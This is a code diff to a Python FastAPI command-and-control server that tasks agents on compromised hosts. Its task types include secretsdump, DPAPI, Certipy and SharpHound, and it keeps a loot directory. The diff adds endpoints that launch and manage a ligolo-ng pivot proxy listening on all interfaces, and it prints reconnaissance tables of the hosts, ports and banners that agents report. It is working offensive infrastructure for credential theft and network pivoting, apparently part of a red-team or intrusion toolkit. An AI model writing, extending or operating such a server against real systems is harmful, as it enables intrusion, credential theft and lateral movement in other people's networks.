@@ -7,7 +7,7 @@ import os
 import requests
 from database import init_db, migrate_db, ensure_server_agent, get_conn
 # from impacket_wrapper import wmi_exec, smb_exec   # disabled — lateral movement via agent tools
-from pivot_manager import ensure_interface, add_route, del_route
+from pivot_manager import ensure_interface, add_route, del_route, start_proxy, stop_proxy, get_proxy_status
 # import bloodhound_client as bh                    # disabled — BH queries done via SharpHound on agent
 
 app = FastAPI()
@@ -24,6 +24,7 @@ def _notify_n8n(event: str, payload: dict):
 
 FILES_DIR = os.path.join(os.path.dirname(__file__), "files")
 LOOT_DIR  = os.path.join(os.path.dirname(__file__), "loot")
+PROXY_BIN = os.path.join(os.path.dirname(__file__), "proxy")
 os.makedirs(FILES_DIR, exist_ok=True)
 os.makedirs(LOOT_DIR,  exist_ok=True)
 app.mount("/files", StaticFiles(directory=FILES_DIR), name="files")
@@ -52,7 +53,7 @@ class TaskResult(BaseModel):
 class NewTask(BaseModel):
     agent_id: str
     instruction: str
-    task_type: str = "shell"   # shell | recon | sharphound | certipy | secretsdump | dpapi | authenticate
+    task_type: str = "shell"   # shell | recon | sharphound | certipy | secretsdump | dpapi | authenticate | aclabuse | pivot
 
 class NewRecon(BaseModel):
     agent_id: str
@@ -69,6 +70,10 @@ class TunnelRegister(BaseModel):
     agent_id:  str
     subnet:    str        # CIDR, e.g. "10.0.2.0/24"
     interface: str = "ligolo"
+
+class ProxyStartRequest(BaseModel):
+    interface: str = "ligolo"
+    port:      int = 11601
 
 
 # ── Agent endpoints ───────────────────────────────────────────────────────────
@@ -147,7 +152,10 @@ def receive_result(data: TaskResult, background_tasks: BackgroundTasks):
         if task["task_type"] == "recon":
             _store_recon_hosts(conn, data.agent_id, data.output)
 
-    print(f"[+] Result for task {data.task_id} [{task['task_type']}] from {data.agent_id}:\n{data.output}")
+    if task["task_type"] == "recon":
+        _print_recon_server(data.task_id, data.agent_id, data.output)
+    else:
+        print(f"[+] Result for task {data.task_id} [{task['task_type']}] from {data.agent_id}:\n{data.output}")
 
     background_tasks.add_task(_notify_n8n, "task_result", {
         "task_id":   data.task_id,
@@ -157,6 +165,29 @@ def receive_result(data: TaskResult, background_tasks: BackgroundTasks):
     })
 
     return {"status": "ok"}
+
+
+def _print_recon_server(task_id: int, agent_id: str, output: str):
+    print(f"[+] Recon result for task {task_id} from {agent_id}:")
+    try:
+        data = json.loads(output)
+        hosts = data.get("hosts", [])
+        print(f"  {'IP':<16}  {'HOSTNAME':<28}  {'PORT':<7}  {'SERVICE':<22}  BANNER")
+        print("  " + "-" * 110)
+        for h in hosts:
+            ip       = h.get("ip", "")
+            hostname = h.get("hostname", "")
+            ports    = h.get("ports", [])
+            if ports:
+                for i, p in enumerate(ports):
+                    row_ip   = ip       if i == 0 else ""
+                    row_host = hostname if i == 0 else ""
+                    banner = (p.get("banner") or "").replace("\r", "").replace("\n", " ").strip()[:55]
+                    print(f"  {row_ip:<16}  {row_host:<28}  {p.get('port',''):<7}  {p.get('service',''):<22}  {banner}")
+            else:
+                print(f"  {ip:<16}  {hostname:<28}  {'—':<7}  {'—':<22}")
+    except Exception:
+        print(f"  {output}")
 
 
 def _store_recon_hosts(conn, agent_id: str, output: str):
@@ -366,6 +397,37 @@ def list_tunnels():
             "SELECT * FROM tunnels ORDER BY created_at DESC"
         ).fetchall()
     return [dict(r) for r in rows]
+
+
+@app.post("/pivot/proxy/start")
+def start_proxy_endpoint(data: ProxyStartRequest):
+    """
+    Create the TUN interface and launch the ligolo-ng proxy in the background.
+    The proxy binary must be at server/proxy (placed there by the operator).
+    """
+    result = start_proxy(data.interface, data.port, PROXY_BIN)
+    if not result["ok"]:
+        raise HTTPException(status_code=500, detail=result["error"])
+    if result.get("already_running"):
+        print(f"[*] Proxy already running (PID {result['pid']})")
+    else:
+        print(f"[+] Proxy started (PID {result['pid']}) — listening on 0.0.0.0:{result['port']}, TUN: {result['interface']}")
+    return result
+
+
+@app.post("/pivot/proxy/stop")
+def stop_proxy_endpoint():
+    """Terminate the running ligolo-ng proxy process."""
+    result = stop_proxy()
+    if result.get("was_running"):
+        print("[*] Proxy stopped")
+    return result
+
+
+@app.get("/pivot/proxy/status")
+def proxy_status_endpoint():
+    """Check whether the ligolo-ng proxy process is alive."""
+    return get_proxy_status()
 
 
 # ── Disabled — BloodHound server-side querying (moved to SharpHound on agent) ─
